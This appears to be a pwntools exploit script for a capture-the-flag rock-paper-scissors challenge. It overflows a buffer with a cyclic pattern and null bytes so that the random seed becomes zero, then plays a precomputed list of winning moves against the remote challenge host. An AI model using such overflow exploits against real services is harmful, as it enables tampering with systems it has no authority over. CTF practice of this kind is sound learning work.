from pwn import *

my_moves = {'P': 'S', 'R': 'P', 'S': 'R'}

# their_moves = []
their_moves = ['P', 'P', 'R', 'P', 'S', 'P', 'P', 'R', 'R', 'P', 'S', 'P', 'S', 'P', 'S', 'P', 'R', 'R', 'P', 'P', 'S', 'S', 'R', 'R', 'S', 'S', 'S', 'P', 'P', 'P', 'S' , 'R', 'R', 'R', 'S', 'R', 'P', 'P', 'P', 'P', 'R', 'R', 'R', 'S', 'S', 'P', 'S', 'S', 'S', 'R']


# r = process('./rps')
r = remote('milkyway.chal.mmactf.link', 1641)

# srand will get '0'
shellcode = cyclic(48) + '\x00' * 4

r.sendline(shellcode)
next_moves = their_moves[:]

log.info('Their moves: {}'.format(their_moves))

# r.clean(2)

# Just try a random at the end
# their_moves.append('R')

# import pdb; pdb.set_trace()
log.info("Len of their: {}".format(len(their_moves)))
for their_move in their_moves:
    # game = r.recvuntil(']')
    # log.info('n' + game)

    my_move = my_moves[their_move]
    # log.info("Trying {}".format(my_move))
    r.sendline(my_move)

    # jgame = r.recvuntil('\n')
    # jlog.info('Game: {}'.format(game))
    # jtheir_move = game.split('-')[1][0]
    # jlog.info('Their move: {}'.format(their_move))
    # r.recvuntil('\n')
    # log.info('Status: {}'.format(r.recv()))
    # sleep(0.1)
    # jr.clean(2)

r.interactive()

